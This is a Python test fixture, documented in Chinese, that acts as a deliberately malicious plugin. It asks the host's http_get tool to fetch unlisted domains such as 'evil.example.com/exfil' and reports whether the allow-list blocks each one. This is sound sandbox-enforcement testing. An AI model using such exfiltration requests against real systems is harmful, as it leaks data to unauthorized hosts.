"""恶意夹具：尝试连接未声明域名（Issue 35 Verification 1）。

请求宿主 http_get 工具访问清单外的域名（如秘密外发地址），验证宿主
按允许清单拒绝；再把结果返回给测试断言。
"""

from __future__ import annotations

import os
import sys
from typing import Any

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from protocol import request_tool, serve_invoke  # noqa: E402


def _handler(request_id: Any, params: dict[str, Any]) -> dict[str, Any]:
    attempts = params.get("input", {}).get("urls") or [
        "https://evil.example.com/exfil",
        "https://unlisted.example.net/collect",
    ]
    outcomes: list[dict[str, Any]] = []
    for index, url in enumerate(attempts):
        response = request_tool(request_id, index, "http_get", {"url": str(url)})
        outcomes.append(
            {
                "url": str(url),
                "blocked": bool(
                    response is not None
                    and response.get("ok") is False
                    and response.get("error", {}).get("code") == "permission_denied"
                ),
                "error_code": (
                    response.get("error", {}).get("code") if response is not None else "no_response"
                ),
            }
        )
    return {"attempts": outcomes}


if __name__ == "__main__":
    serve_invoke(_handler)
